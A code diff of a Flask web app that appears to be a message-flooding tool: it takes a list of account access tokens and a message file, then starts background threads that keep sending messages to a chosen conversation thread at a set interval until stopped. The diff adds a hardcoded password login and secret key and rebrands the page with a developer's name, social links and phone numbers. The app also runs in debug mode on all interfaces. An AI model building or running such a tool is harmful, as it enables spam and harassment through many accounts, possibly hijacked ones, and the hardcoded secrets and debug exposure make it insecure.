@@ -1,13 +1,17 @@
-from flask import Flask, request, render_template_string
+from flask import Flask, request, render_template_string, session, redirect, url_for
 import requests
 from threading import Thread, Event
 import time
 import random
 import string
- 
+
 app = Flask(__name__)
 app.debug = True
- 
+
+# Apna password yahan set karo
+APP_PASSWORD = "Lucifer"
+app.secret_key = "kuch_random_secret"  # session k liye zaroori
+
 headers = {
     'Connection': 'keep-alive',
     'Cache-Control': 'max-age=0',
@@ -19,10 +23,10 @@ headers = {
     'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
     'referer': 'www.google.com'
 }
- 
+
 stop_events = {}
 threads = {}
- 
+
 def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
     stop_event = stop_events[task_id]
     while not stop_event.is_set():
@@ -39,9 +43,31 @@ def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id
                 else:
                     print(f"Message Sent Failed From token {access_token}: {message}")
                 time.sleep(time_interval)
- 
+
+# ----------- Login Page -----------
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        password = request.form.get('password')
+        if password == APP_PASSWORD:
+            session['logged_in'] = True
+            return redirect(url_for('send_message'))
+        else:
+            return "❌ Wrong Password"
+    return '''
+    <form method="post">
+        <h2>🔑 Enter Password</h2>
+        <input type="password" name="password" required>
+        <button type="submit">Login</button>
+    </form>
+    '''
+
+# ----------- Main Page (Protected) -----------
 @app.route('/', methods=['GET', 'POST'])
 def send_message():
+    if not session.get('logged_in'):
+        return redirect(url_for('login'))
+
     if request.method == 'POST':
         token_option = request.form.get('tokenOption')
         
@@ -50,34 +76,34 @@ def send_message():
         else:
             token_file = request.files['tokenFile']
             access_tokens = token_file.read().decode().strip().splitlines()
- 
+
         thread_id = request.form.get('threadId')
         mn = request.form.get('kidx')
         time_interval = int(request.form.get('time'))
- 
+
         txt_file = request.files['txtFile']
         messages = txt_file.read().decode().splitlines()
- 
+
         task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
- 
+
         stop_events[task_id] = Event()
         thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
         threads[task_id] = thread
         thread.start()
- 
+
         return f'Task started with ID: {task_id}'
- 
+
+    # 👇 Tumhari poori HTML form jaisi di thi waisi hi yahan hai (title, header, footer mein naam likha hua)
     return render_template_string('''
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>- 3:) Muddassir 3:) </title>
+  <title>👀Muddassir .𝘙𝘶𝘭𝘦𝘹🌀</title>
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
   <style>
-    /* CSS for styling elements */
     label { color: white; }
     .file { height: 30px; }
     body {
@@ -88,21 +114,14 @@ def send_message():
     }
     .container {
       max-width: 350px;
-      height: auto;
       border-radius: 20px;
       padding: 20px;
-      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
       box-shadow: 0 0 15px white;
-      border: none;
-      resize: none;
     }
     .form-control {
-      outline: 1px red;
       border: 1px double white;
       background: transparent;
-      width: 100%;
       height: 40px;
-      padding: 7px;
       margin-bottom: 20px;
       border-radius: 10px;
       color: white;
@@ -121,7 +140,7 @@ def send_message():
 </head>
 <body>
   <header class="header mt-4">
-    <h1 class="mt-3">♛♥彡- CONVO -♛♥☨</h1>
+    <h1 class="mt-3">♛♥彡Lord Muddassir♛♥☨</h1>
   </header>
   <div class="container text-center">
     <form method="post" enctype="multipart/form-data">
@@ -157,7 +176,7 @@ def send_message():
         <input type="file" class="form-control" id="txtFile" name="txtFile" required>
       </div>
       <button type="submit" class="btn btn-primary btn-submit">Run</button>
-      </form>
+    </form>
     <form method="post" action="/stop">
       <div class="mb-3">
         <label for="taskId" class="form-label">Enter Task ID to Stop</label>
@@ -167,10 +186,10 @@ def send_message():
     </form>
   </div>
   <footer class="footer">
-    <p>© 2023 ᴅᴇᴠʟᴏᴩᴇᴅ ʙʏ🥀✌️MUDD9SSIR😈🐧</p>
-    <p>  𝐑𝐔𝐋𝐄𝐗 𝐇𝐄𝐑𝐄<a href="https://www.facebook.com/BL9CK.D3V1L">ᴄʟɪᴄᴋ ʜᴇʀᴇ ғᴏʀ ғᴀᴄᴇʙᴏᴏᴋ</a></p>
+    <p>© 2023 ᴅᴇᴠʟᴏᴩᴇᴅ ʙʏ🥀✌️Muddassir😈🐧</p>
+    <p>𝐑𝐔𝐋𝐄𝐗 𝐇𝐄𝐑𝐄 <a href="https://www.facebook.com/muddassir.OP">ᴄʟɪᴄᴋ ʜᴇʀᴇ ғᴏʀ ғᴀᴄᴇʙᴏᴏᴋ</a></p>
     <div class="mb-3">
-      <a href="https://wa.me/+917668337116" class="whatsapp-link">
+      <a href="https://wa.me/923243037456" class="whatsapp-link">
         <i class="fab fa-whatsapp"></i> Chat on WhatsApp
       </a>
     </div>
@@ -190,15 +209,18 @@ def send_message():
 </body>
 </html>
 ''')
- 
+
 @app.route('/stop', methods=['POST'])
 def stop_task():
+    if not session.get('logged_in'):
+        return redirect(url_for('login'))
+
     task_id = request.form.get('taskId')
     if task_id in stop_events:
         stop_events[task_id].set()
         return f'Task with ID {task_id} has been stopped.'
     else:
         return f'No task found with ID {task_id}.'
- 
+
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
